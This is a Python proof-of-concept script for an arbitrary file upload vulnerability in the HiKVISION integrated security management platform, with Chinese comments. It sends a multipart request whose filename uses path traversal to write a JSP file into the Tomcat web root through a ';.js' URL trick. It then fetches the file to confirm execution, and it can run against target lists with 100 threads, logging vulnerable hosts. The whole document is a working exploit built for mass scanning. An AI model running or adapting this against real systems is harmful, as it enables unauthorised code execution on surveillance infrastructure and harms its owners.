#HiKVISION综合安防管理平台任意文件上传

import requests,sys,argparse,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
     test=""" """
     print(test)

def main():
    banner()
    parsers=argparse.ArgumentParser(description='HiKVISION综合安防管理平台任意文件上传')
    parsers.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parsers.add_argument('-f','--file',dest='file',type=str,help='please input your filepath')
    args=parsers.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        #mp.map(poc, url_list) 的作用是并行地对 url_list 中的每个 URL 执行 poc 函数（或方法）
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    payload='/center/api/files;.js'

    headers={
        'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryxxmdzwoe',
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
    }
    proxies={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    data='''
         ------WebKitFormBoundaryxxmdzwoe
Content-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/ukgmfyufsi.jsp"
Content-Type:image/jpeg

<%out.println("pboyjnnrfipmplsukdeczudsefxmywex");%>
------WebKitFormBoundaryxxmdzwoe--
'''
    payload1='clusterMgr/ukgmfyufsi.jsp;.js'
    try:
        res1=requests.post(url=target+payload,headers=headers,verify=False,data=data)
        res2=requests.get(url=target+payload1,headers=headers,verify=False)
        if res1.status_code==200 and 'pboyjnnrfipmplsukdeczudsefxmywex' in res2.text:   
                    print(f"[+]目标存在 {target}")
                    with open('result.txt','a') as f:
                        f.write(target+'\n')
        else:
             print(f'[-]目标不存在漏洞 {target}')
    except:
        pass


if __name__ == '__main__':
    main()


